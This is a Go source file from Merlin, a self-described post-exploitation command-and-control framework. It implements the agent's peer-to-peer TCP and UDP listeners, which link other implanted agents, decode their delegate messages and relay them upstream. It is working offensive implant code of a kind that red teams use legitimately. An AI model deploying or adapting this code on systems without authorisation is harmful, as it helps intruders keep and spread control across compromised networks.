// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2022  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package commands

import (
	// Standard
	"bufio"
	"bytes"
	"encoding/gob"
	"fmt"
	"net"
	"strings"
	"time"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg/jobs"
	"github.com/Ne0nd0g/merlin/pkg/messages"

	// Internal
	"github.com/Ne0nd0g/merlin-agent/cli"
	"github.com/Ne0nd0g/merlin-agent/p2p"
)

const (
	TCP = 0
	UDP = 1
)

// p2pListener is a structure for managing and tracking peer to peer listeners created on this Agent
type p2pListener struct {
	Addr     string      // Addr is a string representation of the address the listener is communicating with
	Type     int         // Type is the p2pListener type
	Listener interface{} // Listener holds the connection (e.g., net.Listener for TCP and net.PacketConn for UDP)
}

// String returns a string representation of the p2pListener
func (p *p2pListener) String() string {
	switch p.Type {
	case TCP:
		return "TCP"
	case UDP:
		return "UDP"
	default:
		return fmt.Sprintf("commands/listener/p2pListener.String() unhandled p2pListener type %d", p.Type)
	}
}

// p2pListeners is a slice of instantiated network listeners
var p2pListeners []p2pListener

// Listener binds to the provided interface and port and begins listening for incoming connections from other peer-to-peer agents
func Listener(cmd jobs.Command) (results jobs.Results) {
	cli.Message(cli.DEBUG, fmt.Sprintf("commands/listen.Listener(): entering into function with %+v", cmd))

	if len(cmd.Args) < 1 {
		return jobs.Results{Stderr: fmt.Sprintf("expected 1 arguments with the listener command, received %d: %+v", len(cmd.Args), cmd.Args)}
	}

	// switch on first argument
	switch strings.ToLower(cmd.Args[0]) {
	case "list":
		results.Stdout = fmt.Sprintf("Peer-to-Peer Listeners (%d):\n", len(p2pListeners))
		for i, listener := range p2pListeners {
			results.Stdout += fmt.Sprintf("%d. %s listener on %s\n", i, listener.String(), listener.Addr)
		}
		return
	case "start":
		if len(cmd.Args) < 3 {
			return jobs.Results{Stderr: fmt.Sprintf("expected 3 arguments with the listener command, received %d: %+v", len(cmd.Args), cmd.Args)}
		}
		switch strings.ToLower(cmd.Args[1]) {
		case "tcp":
			err := ListenTCP(cmd.Args[2])
			if err != nil {
				results.Stderr = err.Error()
				return
			}
			results.Stdout = fmt.Sprintf("Successfully started TCP listener on %s", cmd.Args[2])
			return
		case "udp":
			err := ListenUDP(cmd.Args[2])
			if err != nil {
				results.Stderr = err.Error()
				return
			}
			results.Stdout = fmt.Sprintf("Successfully started UDP listener on %s", cmd.Args[2])
			return
		default:
			results.Stderr = fmt.Sprintf("Unknown listener type %s", cmd.Args[1])
		}
	case "stop":
		if len(cmd.Args) < 3 {
			return jobs.Results{Stderr: fmt.Sprintf("expected 3 arguments with the listener command, received %d: %+v", len(cmd.Args), cmd.Args)}
		}
		switch strings.ToLower(cmd.Args[1]) {
		case "tcp":
			for i, listener := range p2pListeners {
				if listener.Listener.(net.Listener).Addr().String() == cmd.Args[2] {
					err := listener.Listener.(net.Listener).Close()
					if err != nil {
						results.Stderr = err.Error()
					} else {
						results.Stdout = fmt.Sprintf("Succesfully closed TCP listener on %s", cmd.Args[2])
					}
					p2pListeners = append(p2pListeners[:i], p2pListeners[i+1:]...)
					return
				}
			}
			results.Stderr = fmt.Sprintf("Unable to find and close TCP listener on %s", cmd.Args[2])
		case "udp":
			for i, listener := range p2pListeners {
				if listener.Listener.(net.PacketConn).LocalAddr().String() == cmd.Args[2] {
					err := listener.Listener.(net.PacketConn).Close()
					if err != nil {
						results.Stderr = err.Error()
					} else {
						results.Stdout = fmt.Sprintf("Successfully closed UDP listener on %s", cmd.Args[2])
					}
					p2pListeners = append(p2pListeners[:i], p2pListeners[i+1:]...)
					return
				}
			}
			results.Stderr = fmt.Sprintf("Unable to find and close UDP listener on %s", cmd.Args[2])
		default:
			results.Stderr = fmt.Sprintf("Unknown listener type %s", cmd.Args[1])
		}
		return
	default:
		return jobs.Results{
			Stderr: fmt.Sprintf("Unknown listener command: %s", cmd.Args[0]),
		}
	}
	return
}

// ListenTCP binds to the provided address and listens for incoming TCP connections
func ListenTCP(addr string) error {
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("commands/listen.TCPListen(): there was an error listening on %s : %s", addr, err)
	}

	// Add to global listeners
	var ok bool
	for _, l := range p2pListeners {
		if l.Type == TCP {
			if listener.Addr() == l.Listener.(net.Listener).Addr() {
				ok = true
			}
		}

	}
	if !ok {
		p2pListeners = append(p2pListeners, p2pListener{
			Addr:     listener.Addr().String(),
			Type:     TCP,
			Listener: listener,
		})
	}

	cli.Message(cli.NOTE, fmt.Sprintf("Started TCP listener on %s and waiting for a connection...", addr))

	// Listen for initial connection from upstream agent
	go accept(listener)
	return nil
}

// ListenUDP binds to the provided address and listens for incoming UDP connections
func ListenUDP(addr string) error {
	listener, err := net.ListenPacket("udp", addr)
	if err != nil {
		return fmt.Errorf("commands/listen.ListenUDP(): there was an error listening on %s : %s", addr, err)
	}
	cli.Message(cli.NOTE, fmt.Sprintf("Started UDP listener on %s and waiting for a connection...", addr))

	// Add to global listeners
	var ok bool
	for _, l := range p2pListeners {
		if l.Type == UDP {
			if listener.LocalAddr() == l.Listener.(net.PacketConn).LocalAddr() {
				ok = true
			}
		}
	}
	if !ok {
		p2pListeners = append(p2pListeners, p2pListener{
			Addr:     listener.LocalAddr().String(),
			Type:     UDP,
			Listener: listener,
		})
	}

	go listenUDP(listener)
	return nil
}

// accept is an infinite loop listening for new connections from Agents
func accept(listener net.Listener) {
	for {
		conn, err := listener.Accept()
		if err != nil {
			cli.Message(cli.WARN, fmt.Sprintf("commands/listen.accept(): there was an error accepting the connection: %s", err))
			break
		}
		go listen(conn)
	}
}

// listen is an infinite loop, used as a go routine, to receive data from incoming connections and subsequently add Delegate messages to the outgoing queue
func listen(conn net.Conn) {
	for {
		data := make([]byte, 500000)
		n, err := bufio.NewReader(conn).Read(data)
		if err != nil {
			cli.Message(cli.WARN, fmt.Sprintf("commands/link.listen(): there was an error reading data from %s: %s", conn.RemoteAddr(), err))
			break
		}
		cli.Message(cli.NOTE, fmt.Sprintf("Read %d bytes from linked Agent %s at %s", n, conn.RemoteAddr(), time.Now().UTC()))

		// Gob decode the message
		var msg messages.Delegate
		reader := bytes.NewReader(data)
		err = gob.NewDecoder(reader).Decode(&msg)
		if err != nil {
			cli.Message(cli.WARN, fmt.Sprintf("commands/link.listen(): there was an error gob decoding a delegate message: %s", err))
			return
		}

		// Store LinkedAgent
		agent, ok := p2p.LinkedAgents.Load(msg.Agent)
		if !ok {
			// Reverse TCP agents need to be added after initial checkin
			linkedAgent := p2p.Agent{
				In:     make(chan messages.Base, 100),
				Out:    make(chan messages.Base, 100),
				Conn:   conn,
				Type:   p2p.TCPREVERSE,
				Remote: conn.RemoteAddr(),
			}
			p2p.LinkedAgents.Store(msg.Agent, linkedAgent)
		} else {
			// Update the Agent's connection to the current one
			linkedAgent := agent.(p2p.Agent)
			linkedAgent.Conn = conn
			p2p.LinkedAgents.Store(msg.Agent, linkedAgent)
		}

		// Add the message to the queue
		p2p.AddDelegateMessage(msg)
	}
}

// listenUDP is an infinite loop, used as a go routine, to receive data from incoming connections and subsequently add Delegate messages to the outgoing queue
func listenUDP(listener net.PacketConn) {
	for {
		data := make([]byte, 500000)
		n, addr, err := listener.ReadFrom(data)
		cli.Message(cli.NOTE, fmt.Sprintf("UDP listener read %d bytes from %s at %s", n, addr, time.Now().UTC()))
		if err != nil {
			cli.Message(cli.WARN, fmt.Sprintf("commands/listener.listenUDP(): there was an error accepting the UDP connection from %s : %s", addr, err))
			break
		}

		// Gob decode the message
		var msg messages.Delegate
		reader := bytes.NewReader(data)
		err = gob.NewDecoder(reader).Decode(&msg)
		if err != nil {
			cli.Message(cli.WARN, fmt.Sprintf("commands/listener.listenUDP(): there was an error gob decoding a delegate message: %s", err))
			return
		}

		// Store LinkedAgent
		agent, ok := p2p.LinkedAgents.Load(msg.Agent)
		if !ok {
			// Reverse UDP agents need to be added after initial checkin
			linkedAgent := p2p.Agent{
				In:     make(chan messages.Base, 100),
				Out:    make(chan messages.Base, 100),
				Type:   p2p.UDPREVERSE,
				Conn:   listener,
				Remote: addr,
			}
			p2p.LinkedAgents.Store(msg.Agent, linkedAgent)
		} else {
			// Update the Agent's connection to the current one
			linkedAgent := agent.(p2p.Agent)
			p2p.LinkedAgents.Store(msg.Agent, linkedAgent)
		}

		// Add the message to the queue
		p2p.AddDelegateMessage(msg)
	}
}
